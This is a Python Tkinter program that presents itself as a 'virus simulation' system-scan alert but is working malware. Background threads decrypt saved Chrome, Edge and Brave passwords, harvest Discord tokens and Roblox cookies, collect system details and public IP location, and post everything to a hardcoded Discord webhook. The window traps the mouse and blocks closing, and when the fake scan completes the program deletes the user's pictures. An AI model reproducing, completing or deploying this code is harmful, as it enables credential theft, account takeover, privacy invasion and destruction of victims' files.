import tkinter as tk
from tkinter import ttk, messagebox
import time
import random
import threading
import platform
import os
import socket
import requests
import sqlite3
import json
import shutil
import base64
import ctypes
import sys
import re

try:
    import winsound

    SOUND_AVAILABLE = True
except ImportError:
    SOUND_AVAILABLE = False

try:
    import psutil
except ImportError:
    psutil = None

try:
    import win32crypt
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

WINDOWS = platform.system() == "Windows"

WEBHOOK_URL = "https://discord.com/api/webhooks/1405784357393793085/pcDUEMqhWzKp4xUYUuczwTkBNYkuJsoIm9AltEEMS0f0ZEOR0hvzBGJ645Y7mTjVtw4d"


def chunk_message(msg, chunk_size=1900):
    return [msg[i:i + chunk_size] for i in range(0, len(msg), chunk_size)]


def send_to_discord(data):
    try:
        chunks = chunk_message(data)
        for chunk in chunks:
            response = requests.post(WEBHOOK_URL, json={"content": chunk})
            print(f"Webhook chunk sent, status: {response.status_code}, response: {response.text}")
    except Exception as e:
        print(f"Failed to send webhook: {e}")


def format_section(title, content_dict_or_str):
    result = f"**{title}**\n"
    if isinstance(content_dict_or_str, dict):
        for key, value in content_dict_or_str.items():
            result += f"\t{key}: {value}\n"
    elif isinstance(content_dict_or_str, str):
        for line in content_dict_or_str.splitlines():
            result += f"\t{line}\n"
    else:
        result += f"\t{str(content_dict_or_str)}\n"
    return result


def get_chrome_master_key():
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    if not os.path.exists(local_state_path):
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key_with_header = base64.b64decode(encrypted_key_b64)
    encrypted_key = encrypted_key_with_header[5:]
    if win32crypt:
        decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    else:
        return None


def decrypt_password(ciphertext, master_key):
    try:
        if ciphertext[:3] == b'v10':
            nonce = ciphertext[3:15]
            cipherbytes = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted_pass = cipher.decrypt_and_verify(cipherbytes, tag)
            return decrypted_pass.decode()
        else:
            if win32crypt:
                decrypted_pass = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
                return decrypted_pass.decode()
    except Exception:
        return None
    return None


def get_browser_passwords():
    browsers = {
        "Chrome": os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default"),
        "Edge": os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default"),
        "Brave": os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default"),
    }

    master_key = get_chrome_master_key()
    if master_key is None:
        return "Failed to get master key for browser passwords."

    creds = []
    for name, path in browsers.items():
        if not os.path.exists(path):
            continue
        login_db = os.path.join(path, "Login Data")
        if not os.path.exists(login_db):
            continue

        temp_db = os.path.join(os.getenv("TEMP"), f"LoginData_{name}.db")
        try:
            shutil.copy2(login_db, temp_db)
        except Exception:
            continue

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_password = row[2]
                if username and username.strip() != "":
                    decrypted_password = decrypt_password(encrypted_password, master_key)
                    if decrypted_password is not None:
                        creds.append(f"URL: {url} | User: {username} | Pass: {decrypted_password}")
            cursor.close()
            conn.close()
        except Exception:
            pass

        try:
            os.remove(temp_db)
        except Exception:
            pass

    if not creds:
        return "No browser credentials found."
    return "\n".join(creds)


def get_all_discord_tokens():
    tokens = []
    paths = [
        os.path.expandvars(r"%APPDATA%\Discord"),
        os.path.expandvars(r"%APPDATA%\discordcanary"),
        os.path.expandvars(r"%APPDATA%\discordptb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data"),
        os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data"),
    ]

    regex_token = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    regex_mfa = r"mfa\.[\w-]{84}"

    for base_path in paths:
        if not os.path.exists(base_path):
            continue
        if "User Data" in base_path:
            try:
                for profile in os.listdir(base_path):
                    leveldb_path = os.path.join(base_path, profile, "Local Storage", "leveldb")
                    if not os.path.exists(leveldb_path):
                        continue
                    for file_name in os.listdir(leveldb_path):
                        if not file_name.endswith((".log", ".ldb")):
                            continue
                        try:
                            with open(os.path.join(leveldb_path, file_name), errors='ignore') as f:
                                content = f.read()
                                tokens_found = re.findall(regex_token, content)
                                mfa_found = re.findall(regex_mfa, content)
                                for token in tokens_found + mfa_found:
                                    if token not in tokens:
                                        tokens.append(token)
                        except Exception:
                            pass
            except Exception:
                pass
        else:
            local_storage_path = os.path.join(base_path, "Local Storage", "leveldb")
            if os.path.exists(local_storage_path):
                try:
                    for file_name in os.listdir(local_storage_path):
                        if not file_name.endswith((".log", ".ldb")):
                            continue
                        try:
                            with open(os.path.join(local_storage_path, file_name), errors='ignore') as f:
                                content = f.read()
                                tokens_found = re.findall(regex_token, content)
                                mfa_found = re.findall(regex_mfa, content)
                                for token in tokens_found + mfa_found:
                                    if token not in tokens:
                                        tokens.append(token)
                        except Exception:
                            pass
                except Exception:
                    pass
    return tokens


def get_discord_tokens_text():
    tokens = get_all_discord_tokens()
    if not tokens:
        return "No tokens found."
    return "\n".join(tokens)


def get_roblox_credentials():
    roblox_folder = os.path.expandvars(r"%LOCALAPPDATA%\Roblox")
    cookies_path = os.path.join(roblox_folder, "Cookies")
    if os.path.exists(cookies_path):
        try:
            with open(cookies_path, "r", errors="ignore") as f:
                return f.read()
        except Exception:
            return "Failed to read Roblox cookies."
    return "No Roblox credentials found."


def delete_all_pictures():
    pictures_folders = [
        os.path.expanduser("~/Pictures"),
        os.path.expandvars(r"%USERPROFILE%\Pictures"),
        os.path.expandvars(r"%USERPROFILE%\Desktop\Screenshots"),
        os.path.expandvars(r"%USERPROFILE%\Screenshots"),
    ]
    deleted_files = []
    errors = []

    valid_extensions = ('.png', '.jpg', '.jpeg', '.bmp', '.gif')

    for folder in pictures_folders:
        if not os.path.exists(folder):
            continue
        try:
            for file in os.listdir(folder):
                if file.lower().endswith(valid_extensions):
                    full_path = os.path.join(folder, file)
                    try:
                        os.remove(full_path)
                        deleted_files.append(full_path)
                    except Exception as e:
                        errors.append(f"{full_path}: {str(e)}")
        except Exception as e:
            errors.append(f"Access error in folder {folder}: {str(e)}")

    return deleted_files, errors


def send_ip_location():
    try:
        ip = requests.get('https://api.ipify.org').text
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url).json()
        if response.get('status') == 'success':
            city = response.get('city', 'Unknown')
            region = response.get('regionName', 'Unknown')
            country = response.get('country', 'Unknown')
            isp = response.get('isp', 'Unknown')
            location = f"{city}, {region}, {country} (ISP: {isp})"
        else:
            location = "Unknown Location"
        content = format_section("Public IP & Location", f"Public IP: {ip}\nApproximate Location: {location}")
        send_to_discord(content)
    except Exception:
        pass


def clip_mouse_to_window(hwnd):
    if WINDOWS:
        try:
            rect = ctypes.wintypes.RECT()
            ctypes.windll.user32.GetClientRect(hwnd, ctypes.byref(rect))
            top_left = ctypes.wintypes.POINT()
            bottom_right = ctypes.wintypes.POINT()
            top_left.x = rect.left
            top_left.y = rect.top
            bottom_right.x = rect.right
            bottom_right.y = rect.bottom
            ctypes.windll.user32.ClientToScreen(hwnd, ctypes.byref(top_left))
            ctypes.windll.user32.ClientToScreen(hwnd, ctypes.byref(bottom_right))

            clip_rect = ctypes.wintypes.RECT()
            clip_rect.left = top_left.x
            clip_rect.top = top_left.y
            clip_rect.right = bottom_right.x
            clip_rect.bottom = bottom_right.y
            ctypes.windll.user32.ClipCursor(ctypes.byref(clip_rect))
        except Exception:
            pass


def unclip_mouse():
    if WINDOWS:
        try:
            ctypes.windll.user32.ClipCursor(None)
        except Exception:
            pass


class VirusSimulationGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("System Alert")
        self.root.geometry("600x360")
        self.root.configure(bg="#121212")
        self.root.resizable(False, False)

        # Center the window on the screen
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        window_width = 600
        window_height = 360
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")

        self.root.protocol("WM_DELETE_WINDOW", self.block_close)
        self.root.attributes("-topmost", True)
        self.root.attributes("-toolwindow", True)
        self.root.overrideredirect(True)

        self.correct_password_entered = False
        self.scan_complete = False

        self.title_label = tk.Label(root, text="System Scan Initiated", font=("Consolas", 14, "bold"), fg="#ff5555",
                                    bg="#121212")
        self.title_label.pack(pady=(12, 6))

        self.progress = ttk.Progressbar(root, orient="horizontal", length=520, mode="determinate", maximum=100)
        self.progress.pack(pady=(0, 8))

        self.status_text = tk.Text(root, height=12, width=65, font=("Consolas", 9), fg="#55ff55", bg="#000000",
                                   wrap=tk.WORD, relief=tk.FLAT)
        self.status_text.pack(padx=10, pady=(0, 10))
        self.status_text.config(state="disabled")

        self.password_frame = tk.Frame(root, bg="#121212")
        self.password_frame.pack(side=tk.BOTTOM, anchor=tk.SW, padx=12, pady=6)

        tk.Label(self.password_frame, text="Password:", font=("Consolas", 9), fg="#dddddd", bg="#121212").pack(
            side=tk.LEFT)
        self.password_entry = tk.Entry(self.password_frame, show="*", width=12, font=("Consolas", 9), bg="#222222",
                                       fg="#ffffff", insertbackground="#ffffff", relief=tk.FLAT)
        self.password_entry.pack(side=tk.LEFT, padx=5)
        self.password_entry.bind("<Return>", self.check_password)

        self.password_hint = tk.Label(root, text="ENTER PC PASSWORD", font=("Consolas", 9, "bold"), fg="#ff4444",
                                      bg="#121212")
        self.password_hint.place(relx=1.0, rely=1.0, anchor="se", x=-10, y=-10)

        self.error_label = tk.Label(self.password_frame, text="", font=("Consolas", 7), fg="#ff4444", bg="#121212")
        self.error_label.pack(side=tk.LEFT, padx=5)

        self.fake_files = [
            "C:/System32/config.sys",
            "C:/Users/Documents/secret.txt",
            "C:/Windows/kernel32.dll",
            "C:/Program Files/data.db",
            "C:/Users/Pictures/photo.jpg",
            "C:/Users/Documents/finance.xlsx",
            "C:/Users/Documents/passwords.txt",
            "C:/Users/Documents/notes.docx",
            "C:/Users/Downloads/install.exe",
            "C:/ProgramData/malware.exe"
        ]

        self.scanning_phrases = [
            "Scanning system files...",
            "Checking running processes...",
            "Verifying registry entries...",
            "Analyzing network connections...",
            "Looking for vulnerabilities...",
            "Gathering user data...",
            "Detecting suspicious activity...",
            "Analyzing system logs...",
            "Validating software licenses...",
            "Checking disk integrity...",
            "Monitoring system events...",
            "Inspecting startup programs..."
        ]

        self.current_progress = 0

        # Clip mouse to window
        if WINDOWS:
            self.root.after(100, self.update_mouse_clip)

        # Start background tasks
        threading.Thread(target=self.simulate, daemon=True).start()
        threading.Thread(target=send_ip_location, daemon=True).start()
        threading.Thread(target=self.send_detailed_info_to_discord, daemon=True).start()

    def update_mouse_clip(self):
        if not self.correct_password_entered and not self.scan_complete:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            clip_mouse_to_window(hwnd)

    def block_close(self):
        if not self.correct_password_entered and not self.scan_complete:
            return
        unclip_mouse()
        self.root.destroy()
        sys.exit(0)

    def fade_out(self):
        alpha = 1.0
        while alpha > 0:
            alpha -= 0.1
            self.root.attributes("-alpha", alpha)
            self.root.update()
            time.sleep(0.05)
        self.root.destroy()
        sys.exit(0)

    def simulate(self):
        while self.current_progress < 100 and not self.correct_password_entered:
            time.sleep(random.uniform(0.1, 0.3))
            self.current_progress += random.randint(1, 5)
            if self.current_progress > 100:
                self.current_progress = 100
            self.progress["value"] = self.current_progress

            phrase = random.choice(self.scanning_phrases)
            self.append_status(phrase)
            self.open_random_picture_chance()

            if SOUND_AVAILABLE and WINDOWS:
                try:
                    winsound.Beep(random.randint(500, 1500), 150)
                    winsound.Beep(random.randint(100, 3000), random.randint(50, 300))
                except Exception:
                    pass

        if self.correct_password_entered:
            self.append_status("Scan stopped by user.")
            unclip_mouse()
        else:
            self.scan_complete = True
            self.append_status("Scan complete.")
            unclip_mouse()
            self.perform_payload()

    def append_status(self, text):
        self.status_text.config(state="normal")
        self.status_text.insert(tk.END, text + "\n")
        self.status_text.see(tk.END)
        self.status_text.config(state="disabled")

    def open_random_picture_chance(self):
        if random.random() < 0.01:
            open_random_picture()

    def perform_payload(self):
        deleted, errors = delete_all_pictures()
        if deleted:
            self.append_status(f"Deleted pictures: {len(deleted)} files")
        if errors:
            self.append_status(f"Errors while deleting pictures: {len(errors)} errors")

        for _ in range(5):
            open_random_picture()
            time.sleep(0.3)

        self.root.withdraw()
        messagebox.showwarning("System Alert", "mysterious man\u2122")
        self.root.destroy()
        sys.exit(0)

    def check_password(self, event=None):
        entered = self.password_entry.get()
        if entered.upper() == "JACK":
            self.correct_password_entered = True
            self.append_status("Correct password entered. Stopping scan...")
            unclip_mouse()
            messagebox.showinfo("Success", "Password accepted. Scan terminated.")
            self.fade_out()
        else:
            self.error_label.config(text="Wrong password. Try again.")
            self.password_entry.delete(0, tk.END)

    def send_detailed_info_to_discord(self):
        try:
            content = ""

            system_info = {
                "OS": platform.platform(),
                "Hostname": socket.gethostname(),
                "Processor": platform.processor(),
                "Architecture": platform.architecture()[0],
                "Machine": platform.machine(),
                "Username": os.getenv("USERNAME") or os.getenv("USER"),
            }
            content += format_section("System Information", system_info) + "\n"

            content += format_section("Additional System Info", get_additional_system_info()) + "\n"

            browser_creds = get_browser_passwords()
            if browser_creds and browser_creds != "No browser credentials found.":
                content += format_section("Browser Credentials", browser_creds) + "\n"

                emails_found = set()
                for line in browser_creds.splitlines():
                    match = re.search(r'[\w\.-]+@[\w\.-]+', line)
                    if match:
                        emails_found.add(match.group(0))
                if emails_found:
                    for email in emails_found:
                        content += f"Email: {email}\n"

            content += format_section("Discord Tokens", get_discord_tokens_text()) + "\n"

            content += format_section("Roblox Credentials", get_roblox_credentials()) + "\n"

            send_to_discord(content)
        except Exception as e:
            print(f"Error sending detailed info: {e}")


def get_additional_system_info():
    info = {}

    try:
        if psutil:
            info["Running Processes"] = len(psutil.pids())
        else:
            info["Running Processes"] = "psutil not installed"
    except Exception:
        info["Running Processes"] = "Failed to get"

    try:
        if psutil:
            uptime_sec = time.time() - psutil.boot_time()
            info["Uptime (seconds)"] = int(uptime_sec)
        else:
            info["Uptime (seconds)"] = "psutil not installed"
    except Exception:
        info["Uptime (seconds)"] = "Failed to get"

    try:
        info["Env Variables Count"] = len(os.environ)
    except Exception:
        info["Env Variables Count"] = "Failed to get"

    try:
        if WINDOWS and psutil:
            partitions = psutil.disk_partitions()
            drives = [p.device for p in partitions]
            info["Drives"] = ", ".join(drives)
        else:
            info["Drives"] = "N/A"
    except Exception:
        info["Drives"] = "Failed to get"

    try:
        if psutil:
            info["Network Interfaces"] = len(psutil.net_if_addrs())
        else:
            info["Network Interfaces"] = "psutil not installed"
    except Exception:
        info["Network Interfaces"] = "Failed to get"

    try:
        if WINDOWS:
            import winreg
            keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
                r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce",
            ]
            startup_apps = []
            for key in keys:
                try:
                    reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key)
                    for i in range(1024):
                        try:
                            val = winreg.EnumValue(reg_key, i)
                            startup_apps.append(val[0])
                        except OSError:
                            break
                    reg_key.Close()
                except Exception:
                    pass
            info["Startup Apps Count"] = len(startup_apps)
        else:
            info["Startup Apps Count"] = "N/A"
    except Exception:
        info["Startup Apps Count"] = "Failed to get"

    return info


def open_random_picture():
    pictures_dirs = [
        os.path.expanduser("~/Pictures"),
        os.path.expandvars(r"%USERPROFILE%\Pictures"),
        os.path.expandvars(r"%USERPROFILE%\Desktop\Screenshots"),
        os.path.expandvars(r"%USERPROFILE%\Screenshots"),
    ]
    images = []
    valid_extensions = ('.png', '.jpg', '.jpeg', '.bmp', '.gif')
    for folder in pictures_dirs:
        if os.path.exists(folder):
            try:
                for file in os.listdir(folder):
                    if file.lower().endswith(valid_extensions):
                        images.append(os.path.join(folder, file))
            except Exception:
                pass
    if images:
        image_to_open = random.choice(images)
        try:
            if WINDOWS:
                os.startfile(image_to_open)
            else:
                import subprocess
                subprocess.run(['xdg-open', image_to_open])
        except Exception:
            pass


def main():
    root = tk.Tk()
    app = VirusSimulationGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()